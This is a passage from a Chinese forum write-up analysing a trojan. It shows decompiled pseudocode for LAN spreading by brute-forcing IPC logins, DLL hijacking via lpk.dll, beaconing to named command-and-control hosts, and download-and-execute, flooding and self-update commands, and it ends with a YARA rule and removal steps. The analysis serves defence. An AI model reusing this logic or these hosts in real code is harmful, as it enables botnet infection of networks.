style="font-size: 14px;">{</span></p><p style="line-height: normal;"><span style="font-size: 14px;">exit(0);</span></p><p style="line-height: normal;"><span style="font-size: 14px;">}</span></p><p style="line-height: normal;"><span style="font-size: 14px;">EnumResource_start();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // 释放DLL资源到C:\WINDOWS\system32\hra33.dll</span></p><p style="line-height: normal;"><span style="font-size: 14px;">wsprintfA(&amp;pFileName, "hra%u.dll", '!');</span></p><p style="line-height: normal;"><span style="font-size: 14px;">Insert_Result(&amp;pFileName);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // 打开hra33.dll&nbsp; 拷贝2个资源到到hra33.DLL 一个是服务名 一个是EXE自身</span></p><p style="line-height: normal;"><span style="font-size: 14px;">Load_hra33();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // 加载hra33.dll&nbsp;&nbsp;&nbsp; 具有DLL劫持功能 具体实现 将EXE同目录创建一个LPK.DLL</span></p><p style="line-height: normal;"><span style="font-size: 14px;">CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Shared_exe_LAN, 0, 0, 0);// 通过密码库 正确的话 就将木马程序 共享局域网 </span></p><p style="line-height: normal;"><span style="font-size: 14px;">Sleep(500u);</span></p><p style="line-height: normal;"><span style="font-size: 14px;">WSAStartup(0x202u, &amp;WSAData);</span></p><p style="line-height: normal;"><span style="font-size: 14px;">CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_4051E0, 0, 0, 0);// 接受网络指令 服务器 Sbcq.f3322.org:9898 </span></p><p style="line-height: normal;"><span style="font-size: 14px;">WSAStartup(0x202u, &amp;WSAData);</span></p><p style="line-height: normal;"><span style="font-size: 14px;">CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_405241, 0, 0, 0);// 接受网络指令 服务器 </span><a style="font-size: 14px; text-decoration: underline;"><span style="font-size: 14px;">www.520123.xyz:9999</span></a></p><p style="line-height: normal;"><span style="font-size: 14px;">while (1)</span></p><p style="line-height: normal;"><span style="font-size: 14px;">{</span></p><p style="line-height: normal;"><span style="font-size: 14px;">dword_409628 = New_Thread((LPTHREAD_START_ROUTINE)sub_40387C, 0);// // 接受网络指令 服务器 </span><a style="font-size: 14px; text-decoration: underline;"><span style="font-size: 14px;">www.520520520.org:9426</span></a></p><p style="line-height: normal;"><span style="font-size: 14px;">WaitForSingleObject(0, 0xFFFFFFFF);</span></p><p style="line-height: normal;"><span style="font-size: 14px;">CloseHandle(0);</span></p><p style="line-height: normal;"><span style="font-size: 14px;">((void(__stdcall *)(_DWORD))closesocket)(0);</span></p><p style="line-height: normal;"><span style="font-size: 14px;">dword_401C84 = 1;</span></p><p style="line-height: normal;"><span style="font-size: 14px;">Sleep(0x12Cu);</span></p><p style="line-height: normal;"><span style="font-size: 14px;">}</span></p></blockquote><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">先来分析下 Shared_exe_LAN 第一个线程做的事情</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">首先本地定义一些用户名和常用密码字典</span></p><p style="font-family: 新宋体; font-size: 19px;"><span style="color: blue;"><img src="/ikanxue/images/667d07114bbc55b9ab476a6aa8efc797057ee0bf.png" style="width: 460px !important; height: 636px !important;"></span></p><blockquote><p style="line-height: normal;"><span style="font-size: 14px;">if (!gethostname(&amp;Sysname, &nbsp; 128))</span></p><p style="line-height: normal;"><span style="font-size: 14px;">{</span></p><p style="line-height: normal;"><span style="font-size: 14px;">v2 = gethostbyname(&amp;Sysname);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // 传入当前电脑名称</span></p><p style="line-height: normal;"><span style="font-size: 14px;">v3 = v2;</span></p><p style="line-height: normal;"><span style="font-size: 14px;">v69 = v2;</span></p><p style="line-height: normal;"><span style="font-size: 14px;">if (v2)</span></p><p style="line-height: normal;"><span style="font-size: 14px;">{</span></p><p style="line-height: normal;"><span style="font-size: 14px;">v70 = 0;</span></p><p style="line-height: normal;"><span style="font-size: 14px;">if (*v2-&gt;h_addr_list)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // 别名不为空</span></p><p style="line-height: normal;"><span style="font-size: 14px;">{</span></p><p style="line-height: normal;"><span style="font-size: 14px;">memset(&amp;Dst, 0, 0x10u);</span></p><p style="line-height: normal;"><span style="font-size: 14px;">memcpy(&amp;v66, *(const void **)v3-&gt;h_addr_list, v3-&gt;h_length);</span></p><p style="line-height: normal;"><span style="font-size: 14px;">strIP = 0;</span></p><p style="line-height: normal;"><span style="font-size: 14px;">dword_40961C = 1;</span></p><p style="line-height: normal;"><span style="font-size: 14px;">memset(&amp;v11, 0, 124u);</span></p><p style="line-height: normal;"><span style="font-size: 14px;">v12 = 0;</span></p><p style="line-height: normal;"><span style="font-size: 14px;">v13 = 0;</span></p><p style="line-height: normal;"><span style="font-size: 14px;">while (1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // 开始遍历局域网用户 成功则为远程用户添加一个任务 用来执行本机的目标程序</span></p><p style="line-height: normal;"><span style="font-size: 14px;">{</span></p><p style="line-height: normal;"><span style="font-size: 14px;">dword_409624 = 0;</span></p><p style="line-height: normal;"><span style="font-size: 14px;">memset(&amp;strIP, 0, 0x80u);</span></p><p style="line-height: normal;"><span style="font-size: 14px;">sprintf(&amp;strIP, "%d.%d.%d.%d", v66, v67, v68, 0);// 得到&nbsp; "192.168.32.1"</span></p><p style="line-height: normal;"><span style="font-size: 14px;">if ("administrator")</span></p><p style="line-height: normal;"><span style="font-size: 14px;">{</span></p><p style="line-height: normal;"><span style="font-size: 14px;">strBuff = (int *)&amp;strUser;</span></p><p style="line-height: normal;"><span style="font-size: 14px;">do</span></p><p style="line-height: normal;"><span style="font-size: 14px;">{</span></p><p style="line-height: normal;"><span style="font-size: 14px;">if (&amp;dword_409644)</span></p><p style="line-height: normal;"><span style="font-size: 14px;">{</span></p><p style="line-height: normal;"><span style="font-size: 14px;">strPwdBuff = (int *)&amp;strPwd;</span></p><p style="line-height: normal;"><span style="font-size: 14px;">do</span></p><p style="line-height: normal;"><span style="font-size: 14px;">{</span></p><p style="line-height: normal;"><span style="font-size: 14px;">Sleep(200u);</span></p><p style="line-height: normal;"><span style="font-size: 14px;">Check_pwd((int)&amp;strIP, &nbsp; *strBuff, *strPwdBuff);// 传入IP 用户名&nbsp; 密码 &nbsp;通过IPC管道检测</span></p><p style="line-height: normal;"><span style="font-size: 14px;">++strPwdBuff;</span></p><p style="line-height: normal;"><span style="font-size: 14px;">} while (*strPwdBuff);</span></p><p style="line-height: normal;"><span style="font-size: 14px;">}</span></p><p style="line-height: normal;"><span style="font-size: 14px;">++strBuff;</span></p><p style="line-height: normal;"><span style="font-size: 14px;">} while (*strBuff);</span></p><p style="line-height: normal;"><span style="font-size: 14px;">}</span></p></blockquote><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="color: rgb(158, 87, 65);"><strong><span style="font-size: 15px;">Check_pwd 实现细节</span></strong></span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;"></span><img src="/ikanxue/images/623e3556226a59c1d88be1ce2d3f3b00c2839046.png" style="width: 770px !important; height: 330.458px !important;"></p><p style="margin-bottom: 15px; line-height: 1.75em; margin-top: 25px;"><span style="font-size: 15px;">总结：这2 个函数 可以循环遍历{局域网IP&nbsp; 通过自身的用户名 密码库} 进行传染</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">接下来 2、3 、4线程执行的框架指令都差不多，只是连接的服务器不一样。细微区别，其他的都一样，线程 3 用的服务器地址是 BASE64 解密后的地址</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><img src="/ikanxue/images/a191c4ad826a5755c728d7a965ebd0259c6cfae1.png" style="width: 770px !important; height: 169.383px !important;"></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">创建个线程 该线程成为僵尸线程。</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">继续深入。</span></p><blockquote><p style="line-height: normal;"><span style="font-size: 14px;">&nbsp; hSocket = Init_connect();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // 网络初始化 连接 返回句柄</span></p><p style="line-height: normal;"><span style="font-size: 14px;">g_Socket = hSocket;</span></p><p style="line-height: normal;"><span style="font-size: 14px;">if (hSocket != -1)</span></p><p style="line-height: normal;"><span style="font-size: 14px;">{</span></p><p style="line-height: normal;"><span style="font-size: 14px;">Sock_Control(hSocket, &nbsp; 75);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // 设置SOCKET的套接字模式</span></p><p style="line-height: normal;"><span style="font-size: 14px;">memset(&amp;Dst, 0, 176u);</span></p><p style="line-height: normal;"><span style="font-size: 14px;">Get_SysInfo((int)&amp;Dst);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // 获取用户的电脑的操作系统的版本信息、CPU处理的频率和数目信息、系统的内存信息以、使用的网络流量的信息以及用户电脑从启动到现在的上线时间，准备将用户的这些信息发送给病毒作者。</span></p><p style="line-height: normal;"><span style="font-size: 14px;">if (Load_hra33() == 1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // 载入DLL</span></p><p style="line-height: normal;"><span style="font-size: 14px;">v52 += 2;</span></p><p style="line-height: normal;"><span style="font-size: 14px;">v53 += 3;</span></p><p style="line-height: normal;"><span style="font-size: 14px;">v54 += 4;</span></p><p style="line-height: normal;"><span style="font-size: 14px;">*(_DWORD *)buf = 176;</span></p><p style="line-height: normal;"><span style="font-size: 14px;">SwitchNumber = 0x77;</span></p><p style="line-height: normal;"><span style="font-size: 14px;">memcpy(SysInfo, &amp;Dst, 176u);</span></p><p style="line-height: normal;"><span style="font-size: 14px;">if (send(g_Socket, buf, 184, 0) != -1)&nbsp;&nbsp;&nbsp; // 将信息发送服务器&nbsp; 肉鸡已上线。。</span></p></blockquote><p style="line-height: normal; margin-top: 5px; margin-bottom: 5px;"><span style="font-size: 15px;"><br></span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">加载 URLDOWNTOFILEA&nbsp; 函数&nbsp; 等待死循环等待服务器的指令</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><img src="/ikanxue/images/865fb4b235480d7c436ed64205525c132b434164.png" style="width: 770px !important; height: 54.6284px !important;"><span style="font-size: 15px;"></span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><img src="/ikanxue/images/c6a18b69c25e20a9b876bf88b2981bf3ef200674.png" style="width: 400px !important; height: 70px !important;"></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">这几个应该是一个自定义的结构体 无法还原&nbsp; 后面会一一用到&nbsp; 现在一个一个分析服务器都会发送哪些指令 来操作客户端</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;"></span></p><blockquote><p style="line-height: normal;"><span style="font-size: 14px;">if (SwitchNumber &gt; 6){ //搞事情. }</span></p><p style="line-height: normal;"><span style="font-size: 14px;">else { if (SwitchNumber == 6){ //搞事情too.&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; }</span></p></blockquote><p style="line-height: normal;"><span style="font-size: 14px;"><br></span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="color: rgb(158, 87, 65); font-size: 16px;"><strong><span style="color: rgb(158, 87, 65);">SWTICH&nbsp; 一个一个分析：</span></strong></span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><strong><span style="font-size: 15px;">Case 5</span></strong><span style="font-size: 15px;">： //我猜测控制全局线程任务&nbsp;避免损耗过大</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><img src="/ikanxue/images/a8be6d286757fd57d36789d2b33c0fc5ad34dc10.png" style="font-family: SimSun; width: 770px !important; height: 390.133px !important;"></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">case 2、3&nbsp;都有不少混淆其他只有一个函数是正常的 篇幅有限&nbsp;举个栗子：</span></p><p style="line-height: 1.75em; margin-top: 15px; margin-bottom: 15px;"><img src="/ikanxue/images/61c5da84c9baafa56bb137b3825973fca95cbf24.png" style="width: 770px !important; height: 653.305px !important;"><img src="/ikanxue/images/7fa8be570c9221b06321e149171ebd122080d399.png" style="width: 770px !important; height: 133.443px !important;"><strong><span style="font-size: 15px;">case 2</span></strong><span style="font-size: 15px;">：// 根据网络传输的参数 指定连接某服务器地址 进行TCP连接 发垃圾包 关闭 循环自定义次数 break;</span></p><p style="line-height: 1.75em; margin-top: 15px; margin-bottom: 15px;"><img src="/ikanxue/images/fab59f9d0b1a168735921e11a5691811124797e0.png" style="width: 770px !important; height: 457.625px !important;"><span style="font-size: 15px;">因IDA的BUG SEND没显示出来,这个故事再次告诉我们F5大法也有问题</span></p><p><img src="/ikanxue/images/27ec7a2bc783720d4f9a0e232ba78f22d4981c06.png" style="width: 684px !important; height: 305px !important;"><br></p><p style="line-height: 1.75em; margin-top: 15px; margin-bottom: 15px;"><span style="font-size: 15px;">我猜测这就是传说中的网络攻击器的肉鸡?<br></span></p><p style="line-height: 1.75em; margin-top: 15px; margin-bottom: 15px;"><strong><span style="font-size: 15px;">case 3</span></strong><span style="font-size: 15px;">：//根据网络传输的参数 运行系统路径下指定程序可以带参数 可以指定运行多少次 break;</span></p><p><img src="/ikanxue/images/630483c6e268b358c91c652534dd1f6430c4a28e.png" style="color: rgb(0, 0, 255); font-family: 新宋体; font-size: 19px; width: 770px !important; height: 336.233px !important;"></p><p style="line-height: 1.75em; margin-top: 15px; margin-bottom: 15px;"><span style="font-size: 15px;">只有这段代码是有效的 其他的都是垃圾指令&nbsp; 根据功能是来攻击当前机器的用户 ..想想自定义次数打开某个东西。</span></p><p style="line-height: 1.75em; margin-top: 15px; margin-bottom: 15px;"><strong><span style="font-size: 15px;">case 4</span></strong><span style="font-size: 15px;">：//等待任务/&nbsp; break;这个就没啥好看的 作者让用户机器暂时不接受任务。</span></p><p style="line-height: 1.75em; margin-top: 15px; margin-bottom: 15px;"><strong><span style="font-size: 15px;">case 5</span></strong><span style="font-size: 15px;">：//猜测是控制全局线程任务 避免损耗过大 全局的BOOL值变量&nbsp; break；</span></p><p style="line-height: 1.75em; margin-top: 15px; margin-bottom: 15px;"><strong><span style="font-size: 15px;">case 6</span></strong><span style="font-size: 15px;">：//关闭互斥体 删除注册表的值 删除自身&nbsp;&nbsp; break；</span></p><p><img src="/ikanxue/images/b2c37fdfed52c5c60667f8de03f0f48e1559b330.png" style="width: 634px !important; height: 204px !important;"><span style="font-size: 15px;">&nbsp;</span></p><p><br></p><p style="line-height: 1.75em; margin-top: 15px; margin-bottom: 15px;"><img src="/ikanxue/images/c1d2372990e0cc2950b78ffa125664f2beeaf238.png" style="width: 595px !important; height: 115px !important;"><span style="font-size: 15px;"> <strong>case 16</strong>：//根据网络传输的参数 保存到临时文件 然后打开运行 支持传参运行&nbsp; break；</span></p><p style="line-height: 1.75em; margin-top: 15px; margin-bottom: 15px;"><img src="/ikanxue/images/836e6d7d8fdbf8d6fc43327444b9ad44741b69db.png" style="width: 770px !important; height: 226.372px !important;"><span style="font-size: 15px;">URLDOWNTOFILEA函数应该是如下图 IDA手残点错了 把参数给搞没了.^_^</span></p><p><img src="/ikanxue/images/9a66549c7210a4fea990f69b0e3c9d3fc445d032.png" style="width: 363px !important; height: 46px !important;"></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><strong><span style="font-size: 15px;">case 18</span></strong><span style="font-size: 15px;">：//更新本身病毒&nbsp; 下载 运行 删除自身&nbsp; break;</span></p><p><img src="/ikanxue/images/729b79ec37ba9b82ea78325c64c465f36bf117db.png" style="width: 770px !important; height: 187.083px !important;"></p><p><img src="/ikanxue/images/f007969276c0bff224636678dfeabbb830a710d7.png" style="width: 661px !important; height: 126px !important;"></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><strong><span style="font-size: 15px;">case 20</span></strong><span style="font-size: 15px;">：//根据网络传输的 URL 打开 IE 浏览器进行弹窗&nbsp; break；</span></p><p><img src="/ikanxue/images/f3ec6da5796765120b1594fcd88e40f31d08b70f.png" style="width: 653px !important; height: 425px !important;"><span style="font-size: 15px;"> <br></span></p><p><span style="font-size: 15px;"><br></span></p><section class="" data-tools="135编辑器" data-id="86517" style="border-width: 0px; border-style: none; border-color: currentcolor; -moz-border-top-colors: none; -moz-border-right-colors: none; -moz-border-bottom-colors: none; -moz-border-left-colors: none; padding: 0px;"><section style="border-top: 1px solid rgb(221, 221, 221); margin: 10px auto;"><p class="" data-brushtype="text" style="padding: 6px 5px 0px; border-top: 2px solid rgb(239, 112, 96); display: inline-block; margin: -1px 0px 0px; font-weight: normal; line-height: 1.1; font-size: 18px;">3. 解决方案/总结</p></section></section><p style="line-height: normal; margin-top: 5px; margin-bottom: 5px;"><span style="font-size: 16px;"><strong><br></strong></span></p><p style="margin-bottom: 15px; line-height: 1.75em; margin-top: 5px;"><span style="font-size: 16px;"><strong>3.1&nbsp; 提取病毒的特征，利用杀毒软件查杀</strong></span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">Ghijkl Nopqrstu Wxy 的 16 进制字符串为 4768696a6b6c204e6f70717273747520577879</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">Yara 规则配合 ClamAV：</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;"></span></p><blockquote><p style="line-height: normal;"><span style="font-size: 14px;">rule 3601Virs</span></p><p style="line-height: normal;"><span style="font-size: 14px;">{</span></p><p style="line-height: normal;"><span style="font-size: 14px;">&nbsp;&nbsp;&nbsp; strings:</span></p><p style="line-height: normal;"><span style="font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $my_text_string = "Ghijkl &nbsp; Nopqrstu Wxy"</span></p><p style="line-height: normal;"><span style="font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $my_hex_string = {47 68 69 6a 6b 6c &nbsp; 20 4e 6f 70 71 72 73 74 75 20 57 78 79 }</span></p><p style="line-height: normal;"><span style="font-size: 14px;">&nbsp;&nbsp;&nbsp;</span></p><p style="line-height: normal;"><span style="font-size: 14px;">&nbsp;&nbsp;&nbsp; condition:</span></p><p style="line-height: normal;"><span style="font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $my_text_string or $my_hex_string</span></p><p style="line-height: normal;"><span style="font-size: 14px;">}</span></p></blockquote><p style="line-height: normal;"><span style="font-size: 14px;"><br></span></p><p style="margin-top: 15px; line-height: 1.75em; margin-bottom: 25px;"><img src="/ikanxue/images/11520e95fd7ed6ff0abf98142b39fc4e527dfb4d.png" style="font-family: Calibri; width: 770px !important; height: 282.975px !important;"></p><p style="margin-bottom: 15px; line-height: 1.75em; margin-top: 20px;"><span style="font-size: 16px;"><strong>3.2 手工查杀步骤 查杀思路 </strong></span><span style="font-size: 15px;"><br></span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">通过服务名称"Ghijkl Nopqrstu Wxy" 可以得到服务绑定的 EXE 程序</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">1. 停止服务</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">2. 删除注册表的键值</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">3. 删除服务绑定的EXE windows目录下</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">4. 找到system系统目录下 hra33.dll 删除</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">5. 删除所有非system32目录下的lpk.dll</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;"><br></span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">这个病毒不难 但是对于我们这种新手来说 需要花时间就能搞定了&nbsp;此外 感谢15PB老师们的辛勤栽培!!!</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;"></span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em; text-align: center;"><span style="font-size: 15px; color: rgb(136, 136, 136);">本文由看雪论坛 荒野猎人<span class=""> </span>原创</span><span style="font-size: 15px;"><br></span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;"></span><br></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;"></span></p><p style="margin-top: 15px; margin-bottom: 15px; max-width: 100%; min-height: 1em; line-height: 1.75em; box-sizing: border-box !important; overflow-wrap: break-word !important;"><span style="max-width: 100%; color: rgb(79, 138, 187); box-sizing: border-box !important; overflow-wrap: break-word !important;"><strong style="max-width: 100%; box-sizing: border-box !important; overflow-wrap: break-word !important;">你可能对以下内容感兴趣：<br></strong></span></p><hr style="max-width: 100%; line-height: 25.6px; box-sizing: border-box !important; overflow-wrap: break-word !important;"><p style="max-width: 100%; min-height: 1em; line-height: 25.6px; box-sizing: border-box !important; overflow-wrap: break-word !important;"><br style="max-width: 100%; box-sizing: border-box !important; overflow-wrap: break-word !important;"></p><ul class="list-paddingleft-2" style="list-style-type: circle;"><li><p style="margin-top: 10px; margin-bottom: 10px; max-width: 100%; min-height: 1em; line-height: normal; box-sizing: border-box !important; overflow-wrap: break-word !important;"><span style="max-width: 100%; font-size: 15px; box-sizing: border-box !important; overflow-wrap: break-word !important;"><a href="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458282630&amp;idx=1&amp;sn=61fcbc708235dec5d7897a0d7c315756&amp;chksm=b1815a0c86f6d31a50ba1f9a39d876e28f2c71096100b28e961df185f7be94ec77b9199efd51&amp;scene=21#wechat_redirect" target="_blank" style="max-width: 100%; box-sizing: border-box !important; overflow-wrap: break-word !important;">等你来挑战！| 看雪 CTF 2017 攻击篇</a></span></p></li><li><p style="margin-top: 10px; margin-bottom: 10px; max-width: 100%; min-height: 1em; line-height: normal; box-sizing: border-box !important; overflow-wrap: break-word !important;"><span style="max-width: 100%; font-size: 15px; box-sizing: border-box !important; overflow-wrap: break-word !important;"><a href="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458282621&amp;idx=1&amp;sn=15f5bc0fa2b0b34ae241668b23a3939b&amp;chksm=b1815af786f6d3e1fd4bad2c336d725ec600551a6477bbc4c6af93167074ac83873aeba89938&amp;scene=21#wechat_redirect" target="_blank" style="max-width: 100%; box-sizing: border-box !important; overflow-wrap: break-word !important;">【终于等到你！】看雪 CTF 2017</a></span></p></li><li><p style="margin-top: 10px; margin-bottom: 10px; max-width: 100%; min-height: 1em; line-height: normal; box-sizing: border-box !important; overflow-wrap: break-word !important;"><span style="max-width: 100%; box-sizing: border-box !important; overflow-wrap: break-word !important; font-size: 15px;"><a href="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458283039&amp;idx=2&amp;sn=7965f942fd1629eb4b0502b01a522998&amp;chksm=b1815c9586f6d583b224490858104e7a5e5affad9542fe33da744c091ec234c3a55016f41690&amp;scene=21#wechat_redirect" target="_blank" data_ue_src="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458283039&amp;idx=2&amp;sn=7965f942fd1629eb4b0502b01a522998&amp;chksm=b1815c9586f6d583b224490858104e7a5e5affad9542fe33da744c091ec234c3a55016f41690&amp;scene=21#wechat_redirect">MS17-010 SMB 远程命令执行漏洞利用分析</a><br></span></p></li><li><p style="margin-top: 10px; margin-bottom: 10px; max-width: 100%; min-height: 1em; line-height: normal; box-sizing: border-box !important; overflow-wrap: break-word !important;"><span style="max-width: 100%; font-size: 15px; box-sizing: border-box !important; overflow-wrap: break-word !important;"><a href="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458283033&amp;idx=2&amp;sn=7a0d3fa2c8c5e2bdcac6379351269330&amp;chksm=b1815c9386f6d585439b2186c5fc7099c74ce5398483563db182f868911a3a2c6c4be7500021&amp;scene=21#wechat_redirect" target="_blank" data_ue_src="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458283033&amp;idx=2&amp;sn=7a0d3fa2c8c5e2bdcac6379351269330&amp;chksm=b1815c9386f6d585439b2186c5fc7099c74ce5398483563db182f868911a3a2c6c4be7500021&amp;scene=21#wechat_redirect">新手逆向学习--Win7 下 64 位扫雷逆向以及辅助制作</a><br style="max-width: 100%; box-sizing: border-box !important; overflow-wrap: break-word !important;"></span></p></li><li><p style="margin-top: 10px; margin-bottom: 10px; max-width: 100%; min-height: 1em; line-height: normal; box-sizing: border-box !important; overflow-wrap: break-word !important;"><a href="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458282703&amp;idx=3&amp;sn=bfa728ff73cd389cd9258ca32008c6e2&amp;chksm=b1815a4586f6d353468f3adf9545aab3ffdce4f4c3e0e47c967298eca045db0558e37865c3a7&amp;scene=21#wechat_redirect" target="_blank" style="max-width: 100%; font-size: 15px; box-sizing: border-box !important; overflow-wrap: break-word !important;"><span style="max-width: 100%; box-sizing: border-box !important; overflow-wrap: break-word !important;"></span></a><a href="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458283005&amp;idx=2&amp;sn=2fc411b70549c789085e517ef6dfc3e9&amp;chksm=b1815b7786f6d261975cd000d4ddf2c4cffe3cf2d8ab06d870e7971e862c29c7278996bdfb6c&amp;scene=21#wechat_redirect" target="_blank" style="font-size: 15px; text-decoration: none;"><span style="font-size: 15px;"></span></a><a href="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458283017&amp;idx=3&amp;sn=745024d678707b6dcf0cdc94ff5472a5&amp;chksm=b1815c8386f6d59538bfeeb8d3837007f07b0b4d3cd77b439f7856edd391127b6b2f36fb105d&amp;scene=21#wechat_redirect" target="_blank" data_ue_src="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458283017&amp;idx=3&amp;sn=745024d678707b6dcf0cdc94ff5472a5&amp;chksm=b1815c8386f6d59538bfeeb8d3837007f07b0b4d3cd77b439f7856edd391127b6b2f36fb105d&amp;scene=21#wechat_redirect" style="font-size: 15px; text-decoration: none;"><span style="font-size: 15px;">Ring3 注入总结及编程实现【有码】</span></a><br style="max-width: 100%; box-sizing: border-box !important; overflow-wrap: break-word !important;"></p></li><li><p style="margin-top: 10px; margin-bottom: 10px; max-width: 100%; min-height: 1em; line-height: normal; box-sizing: border-box !important; overflow-wrap: break-word !important;"><span style="max-width: 100%; font-size: 15px; box-sizing: border-box !important; overflow-wrap: break-word !important;"><a href="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458283003&amp;idx=1&amp;sn=bcfd852aea24f274bf8fda85f9300a85&amp;chksm=b1815b7186f6d26758f7f0f1cb0c7ec9da888ab0d80a7b2e2850453bfc03f05640443839d7bf&amp;scene=21#wechat_redirect" 